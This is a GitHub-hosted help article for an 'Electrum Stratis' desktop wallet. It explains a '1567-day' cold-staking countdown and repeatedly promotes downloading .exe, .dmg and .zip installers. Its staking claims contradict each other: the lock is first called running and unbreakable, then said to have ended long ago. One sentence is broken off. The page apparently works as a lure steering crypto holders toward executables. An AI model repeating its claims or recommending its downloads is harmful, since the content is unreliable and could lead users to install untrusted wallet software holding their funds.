![Electrum-Stratis](assets/banner-article.png)

# The 1567-day countdown, explained

<p align="center">What the countdown measures</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The countdown is the remaining time on a staking lock: coins committed to cold staking stay unspendable until the period ends, and 1567 days is the full length of that period. The number is not a bug, a sync error or a penalty - it is the term you agreed to when the coins were staked. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and it shows the countdown so the commitment is visible rather than implied.

## You'll see this if

<div align="center">

| What you see | What it means | Can you spend now? |
|---|---|---|
| 1567 days remaining | The lock has just started | No |
| A number shrinking daily | Time passing normally | No, until it reaches zero |
| A number that never moves | Time not advancing, or a display fault | Check the date and the chain |
| Zero | The lock has ended | Yes, subject to confirmations |
| Coins "missing" from spendable | They are locked, not gone | No - they are still yours |

</div>

The distinction that matters is between locked and lost. Locked coins are present, controlled by your keys, and unavailable for a defined period; lost coins have no key. A countdown is evidence of the first.

## Why it happens

Cold staking separates the keys that stake from the keys that spend, which lets a holder participate without keeping a spending key online. The trade is a time commitment: the network needs to know the staked coins will not move, or the arrangement could be gamed by staking and withdrawing in the same block.

A fixed term makes that commitment enforceable without a central authority. The wallet records the start, computes the end and displays the remainder. Nothing about the coins changes on chain - they stay at your address, they remain yours, and the countdown is the only thing standing between them and a spend.

The length is a design parameter, not a market rate. It is long by the standards of most protocols, which is why the countdown surprises people who staked without reading the term. The honest framing is that a nearly four-and-a-third-year lock is a serious commitment, and the wallet's job is to make it legible before and after the decision. A holder who sees the number only afterwards has been informed too late, which is why the term is shown at the point of commitment rather than buried in a dialog, and why the countdown stays visible for the whole term.

## Fix

1. **Read the countdown before staking, not after.** The wallet shows the term at the point of commitment; if the number is unacceptable, do not stake those coins.
2. **Treat locked coins as a separate balance.** Plan spending from unlocked coins only. A wallet that shows a total balance and a spendable balance is telling you two different things.
3. **Check the number is moving.** A countdown that stays identical across days suggests the clock or the chain view is wrong; compare with the health panel and an explorer.
4. **Wait out the term rather than fighting it.** There is no early exit, no fee that shortens it and no support channel that unlocks coins. Any offer to do so is fraud.
5. **Prepare the post-lock move in advance.** Decide where the coins go when the term ends, so the first spend is deliberate rather than improvised.

If the countdown reaches zero and the coins are still not spendable, allow for confirmations and check the height; the lock ends at a block, not at a wall-clock instant.

## If that did not work

If the countdown shows a number larger than the term you expected, the coins may have been staked again or the lock restarted. Check the staking history rather than the summary.

If the coins do not appear at all, that is not a countdown problem: it is an address or connection problem, and the countdown is a red herring until the wallet can see the chain.

If someone offers to release locked coins for a fee, the offer is fraudulent. A lock enforced by the chain cannot be released by a person, and the request will be for a seed or a payment. The countdown is enforced by the software the project currently ships, available from the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19); no build of it can shorten a lock, and [Electrum Stratis security and keys](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md).

## Prevention

- Read the lock term before committing coins.
- Keep enough unlocked balance for foreseeable spending.
- Note the end date somewhere outside the wallet.
- Never pay for an early release.
- Check the countdown after any restore, to confirm the lock survived with the keys.
- Check the countdown in the actively maintained build, where the lock display matches the chain.

## FAQ

### Why is my balance locked for 1567 days?

Because cold staking commits the coins for a fixed term, and that term is the length of the lock. The coins remain yours and become spendable when the countdown ends.

### Can I unlock staked coins early?

No. The lock is enforced by the chain, not by the wallet, and no fee or support request shortens it. Offers to release locked coins are scams.

### Are locked coins still mine?

Yes. They sit at your address, controlled by your keys, and they return to spendable status when the term ends. A lock restricts timing, not ownership.

### What happens when the countdown reaches zero?

The coins become spendable, subject to the usual confirmations. Plan the destination in advance, and treat the first transaction after a long lock as a deliberate one.

<!-- DOWNLOAD-BLOCK -->

The countdown matters because it changed what a balance could do, not because the number itself is magic. Coins locked at genesis became spendable after the interval elapsed, and anything still sitting in an old wallet is spendable now for the same reason. If a page tells you the lock is still running, the page is out of date; the chain's height is the authority.

## Related articles

- [Ledger and cold staking: what actually worked](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/cold-staking-with-a-hardware-wallet.md)
- [Does Stratis work only on STRAX now?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/does-the-legacy-chain-still-run.md)
- [Moving coins between wallets without losing fees](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/move-coins-without-wasting-fees.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
